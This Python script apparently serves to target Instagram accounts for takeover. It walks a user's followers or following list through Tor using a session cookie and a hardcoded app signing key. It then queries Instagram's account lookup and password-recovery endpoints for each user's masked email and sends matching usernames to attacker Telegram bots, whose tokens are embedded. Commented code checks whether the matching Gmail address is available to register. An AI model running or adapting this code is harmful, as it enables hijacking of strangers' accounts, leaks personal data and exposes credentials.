from requests import session
from threading import Thread
from time import sleep
from pprint import pprint
from sys import argv
from os import system
from uuid import uuid4
from hashlib import sha256
from hmac import new
from random import randrange,choice
s=session()

sessionid=argv[1]

headers={
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
'Accept': '*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'X-CSRFToken': 'jePiFEVbR601LfzdcUnr8N4eqVfPzx1x',
'X-IG-App-ID': '936619743392459',
'X-ASBD-ID': '198387',
'X-IG-WWW-Claim': 'hmac.AR0Oek9N6Zy0febd85Op9bf63YqHa-zniZiR0_QLldJTBTgz',
'Cookie': 'mid=YmGL7gAEAAGkW08352UoYnWkzBZC; ig_did=646869FF-C8B3-43CA-881D-DF6A2FDA56C0; ig_nrcb=1; shbid="6960\0543023329553\0541682530502:01f72b2c3fe89dc890dfaf5de9f6fa97ee5d4d979dbb149fb81164a4bce2fcb1a153e278"; shbts="1650994502\0543023329553\0541682530502:01f7a1ca40d42fec7709fa643c7961e129e61b4d6f1d16ffa09fb445a4610361e4bfd2e8"; datr=8pNkYvgU1LT4wTH16U1UF-2N; csrftoken=jePiFEVbR601LfzdcUnr8N4eqVfPzx1x; ds_user_id=3023329553; rur="CLN\0543023329553\0541682530771:01f7fb0dacffdc1bef50b1e33abec892c8159005baee498bd9294411187df0b83d97dbeb"; sessionid={}'.format(sessionid),
}

s.proxies={"http":  "socks5://127.0.0.1:9050","https": "socks5://127.0.0.1:9050"}
def following(s,user_id,next_max_id=''):
	return s.get('https://i.instagram.com/api/v1/friendships/{}/following/?max_id={}'.format(user_id,next_max_id),headers=headers).json()
def followers(s,user_id,next_max_id=''):
	return s.get('https://i.instagram.com/api/v1/friendships/{}/followers/?max_id={}'.format(user_id,next_max_id),headers=headers).json()
def reset(s,user,email):
	guid="{}-{}-{}-{}-{}".format(uuid4().hex[:8],uuid4().hex[:4],uuid4().hex[:4],uuid4().hex[:4],uuid4().hex[:12])
	guid2="{}-{}-{}-{}-{}".format(uuid4().hex[:8],uuid4().hex[:4],uuid4().hex[:4],uuid4().hex[:4],uuid4().hex[:12])
	aid="{}-{}-{}-{}-{}".format(uuid4().hex[:8],uuid4().hex[:4],uuid4().hex[:4],uuid4().hex[:4],uuid4().hex[:12])
	device_id="{}".format(uuid4().hex[:16])
	sig=new('b4a23f5e39b5929e0666ac5de94c89d1618a2916'.encode('utf-8'), str(randrange(0,999)).encode('utf-8'), sha256).hexdigest()
	r=s.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',data={

				"signed_body":"{}.{}".format('SIGNATURE','{"_csrftoken":"D07zNK8oeT4ypwt5jd6TUi7Ru7A2yUlC","adid":"'+aid+'","guid":"'+guid+'","device_id":"android-'+device_id+'","query":"hmsa","waterfall_id":"fac69495-57d9-42fd-93e6-b200a8fafd49"}'),"ig_sig_key_version":"4"
				},
				headers={

				'X-IG-App-Locale': 'en_US',
				'X-IG-Device-Locale': 'en_US',
				'X-IG-Mapped-Locale': 'en_US',
				'X-Pigeon-Session-Id': '0a30183c-4b8d-4260-b3af-4e21fe8c76dc',
				'X-Pigeon-Rawclienttime': '1651000354.058',
				'X-IG-Connection-Speed': '-1kbps',
				'X-IG-Bandwidth-Speed-KBPS': '-1.000',
				'X-IG-Bandwidth-TotalBytes-B': '0',
				'X-IG-Bandwidth-TotalTime-MS': '0',
				'X-Bloks-Version-Id': 'a28d5c7230ceed88159f332dce4ad89ff4ceb589502350df7965ce295cdce4bb',
				'X-IG-WWW-Claim': '0',
				'X-Bloks-Is-Layout-RTL': 'false',
				'X-IG-Device-ID': guid,
				'X-IG-Android-ID': 'android-'+device_id,
				'X-IG-Connection-Type': 'WIFI',
				'X-IG-Capabilities': '3brTvwM=',
				'X-IG-App-ID': '567067343352427',
				'User-Agent': 'Instagram 140.0.0.30.126 Android (26/8.0.0; 320dpi; 768x1184; unknown/Android; Custom Phone_5; vbox86p; vbox86; en_US; 212676902)',
				'Accept-Language': 'en-US',
				'Cookie': 'mid=YmhDrAABAAHFG0VXCPY4ir3pFRst; csrftoken=D07zNK8oeT4ypwt5jd6TUi7Ru7A2yUlC',

				},
				

		).json()
	if 'wait' in str(r):
		print("W")
		return 2
	elif str(r['body'])[20:].split(" ")[0].split("@")[0][0] == email[0] and str(r['body'])[20:].split(" ")[0].split("@")[0][-1] == email[-1]:
		print(str(r['body'])[20:].split(" ")[0])
		return 1

	else:
		return 0
def checkIsMota7(s,email):
	headersGmail={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0","Content-Type": "application/json; charset=utf-8"}
	data='{"input01":{"Input":"GmailAddress","GmailAddress":"'+'2002219k@gmail.com'+'","FirstName":"JKHack","LastName":"JKHack"},"Locale":"en"}'
	check=s.post('https://accounts.google.com/InputValidator?resource=SignUp&service=mail',data=data,headers=headersGmail)
	# print(check.content)
	if 'That looks like your email address. You can enter that below. Choose a new Google username' in check.content:
		return 1
	elif 'You entered an email address that is already' in check.content:
		return 0
	
	else:
		return 2
def lookup(s,user,email):
	guid="{}-{}-{}-{}-{}".format(uuid4().hex[:8],uuid4().hex[:4],uuid4().hex[:4],uuid4().hex[:4],uuid4().hex[:12])
	guid2="{}-{}-{}-{}-{}".format(uuid4().hex[:8],uuid4().hex[:4],uuid4().hex[:4],uuid4().hex[:4],uuid4().hex[:12])
	aid="{}-{}-{}-{}-{}".format(uuid4().hex[:8],uuid4().hex[:4],uuid4().hex[:4],uuid4().hex[:4],uuid4().hex[:12])
	device_id="{}".format(uuid4().hex[:16])
	sig=new('b4a23f5e39b5929e0666ac5de94c89d1618a2916'.encode('utf-8'), str(randrange(0,999)).encode('utf-8'), sha256).hexdigest()
	r=s.post('https://i.instagram.com/api/v1/users/lookup/',data={

				"signed_body":"{}.{}".format('SIGNATURE',r'{"country_codes":"[{\"country_code\":\"1\",\"source\":[\"default\"]}]","_csrftoken":"D07zNK8oeT4ypwt5jd6TUi7Ru7A2yUlC","q":"'+user+'","guid":"f4b2a735-9663-4498-bb0b-5b9e6e2df449","device_id":"android-'+device_id+'","android_build_type":"release","waterfall_id":"fac69495-57d9-42fd-93e6-b200a8fafd49","directly_sign_in":"true"}'),


				"ig_sig_key_version":"4"
				},
				headers={

				'X-IG-App-Locale': 'en_US',
				'X-IG-Device-Locale': 'en_US',
				'X-IG-Mapped-Locale': 'en_US',
				'X-Pigeon-Session-Id': '0a30183c-4b8d-4260-b3af-4e21fe8c76dc',
				'X-Pigeon-Rawclienttime': '1651000354.058',
				'X-IG-Connection-Speed': '-1kbps',
				'X-IG-Bandwidth-Speed-KBPS': '-1.000',
				'X-IG-Bandwidth-TotalBytes-B': '0',
				'X-IG-Bandwidth-TotalTime-MS': '0',
				'X-Bloks-Version-Id': 'a28d5c7230ceed88159f332dce4ad89ff4ceb589502350df7965ce295cdce4bb',
				'X-IG-WWW-Claim': '0',
				'X-Bloks-Is-Layout-RTL': 'false',
				'X-IG-Device-ID': 'f4b2a735-9663-4498-bb0b-5b9e6e2df449',
				'X-IG-Android-ID': 'android-'+device_id,
				'X-IG-Connection-Type': 'WIFI',
				'X-IG-Capabilities': '3brTvwM=',
				'X-IG-App-ID': '567067343352427',
				'User-Agent': 'Instagram 140.0.0.30.126 Android (26/8.0.0; 320dpi; 768x1184; unknown/Android; Custom Phone_5; vbox86p; vbox86; en_US; 212676902)',
				'Accept-Language': 'en-US',
				'Cookie': 'mid=YmhDrAABAAHFG0VXCPY4ir3pFRst; csrftoken=D07zNK8oeT4ypwt5jd6TUi7Ru7A2yUlC',

				},
				

		).json()

	print(str(r['obfuscated_email']))
	# print(str(r['obfuscated_email'].split('@')[0])[0])
	# print(str(r['obfuscated_email'].split('@')[0])[-1])
	try:
		if 'wait' in str(r):
			# print("W")
			return 2
		elif str(r['obfuscated_email'].split('@')[0])[0] == email[0] and str(r['obfuscated_email'].split('@')[0])[-1] == email[-1]:
			if '@gmail.com' in str(r['obfuscated_email']):
				s.get('https://api.telegram.org/bot5354659321:AAHuANYyzs3njrG95_U6nnB-FO4A209QDqk/sendMessage?text={}&chat_id=1550321716'.format(user))

				# while 1:
					# i=checkIsMota7(s,user+"@gmail.com")
					# if i==1:
					# 	s.get('https://api.telegram.org/bot5360667370:AAEtukL302cmPRU4YzqXbzSvgEDs_nSwvac/sendMessage?text={}&chat_id=5064677547'.format(user))
					# elif i==0:
					# 	pass
					# 	break
					# else:
					# 	pass
					
			elif '@g*****.com' in str(r['obfuscated_email']):
				s.get('https://api.telegram.org/bot5354659321:AAHuANYyzs3njrG95_U6nnB-FO4A209QDqk/sendMessage?text={}&chat_id=1550321716'.format(user))
				


				# while 1:
					# i=checkIsMota7(s,user+"@googlemail.com")
					# if i==1:
					# 	# s.get('https://api.telegram.org/bot5350934815:AAHsm0LrQ_7gqDw7J2s9ca5Vf24JnZYAjDY/sendMessage?text={}&chat_id=5064677547'.format(user))
					# 	break
					# elif i==0:
					# 	pass
					# 	break
					# else:
					# 	pass

			elif 'yahoo.com' in str(r['obfuscated_email']):
				print("SS")				
				s.get('https://api.telegram.org/bot5146751556:AAFVJWAoyhRvQe0YzPHu18S7Gbd3jIxE1fg/sendMessage?text={}&chat_id=1550321716'.format(user))
			else:
				# print("SSS")
				s.get('https://api.telegram.org/bot5315905920:AAGMrcmLQSos_ZWh41RyRGub1euvQvFFPYs/sendMessage?text={}&chat_id=1550321716'.format(user))
				# s.get('https://api.telegram.org/bot5331834681:AAEfzL6DAy6caL2dl8yQYgBMpfqwgea8nTc/sendMessage?text={}&chat_id=5064677547'.format(user))
				pass
			return 1
				# print(user)
		else:
			# print("DONE,2")
			return 0
	except Exception as e:
		# print(str(e))
		return 0
# python motah '3023329553:WNPSzNO3izlD0c:7' 'hanginoutapp' 1 0.1
# lookup(s,'wwwwoodcompanyruu','wwwwoodcompanyruu')
# exit()
user_id=s.get('https://www.instagram.com/{}/?__a=1'.format(argv[2]),headers=headers).json()['logging_page_id'][12:]
# print(user_id)
next_max_id=''
bad=[]
def start(_):
	while 1:
		r=reset(s,_['username'],_['username'])
		if r == 1:
			print(_['username'])
			break
		elif r==2:
			pass
		else:
			print("pass",_['username'])
			break
def _start(_):
	while 1:
		r=lookup(s,_['username'],_['username'])
		if r == 1:
			print(_['username'])
			pass
			break
		elif r==2:
			# print("return")
			pass
		else:
			# print("pass",_['username'])
			break
while 1:

	if int(argv[3]):
		follow=followers(s,user_id,next_max_id)
	else:
		follow=following(s,user_id,next_max_id)
	if len(follow['users']):
		for _ in follow['users']:

			if '.' in _['username'] or '_' in _['username'] or _['username'] in bad:
				pass
			else:
				bad.append(_['username'])
				Thread(target=_start,args=(_,)).start()
			sleep(float(argv[4]))
			system("killall -HUP tor")
	else:
		if next_max_id:
			pass
		else:
			break
	# print("Done")
	try:
		next_max_id=follow['next_max_id']
		# print(1,next_max_id)
		if next_max_id =='':
			print("END")
			break
	except Exception as e:
		if 'next_max_id' in str(e):
			print("END")
			break



	

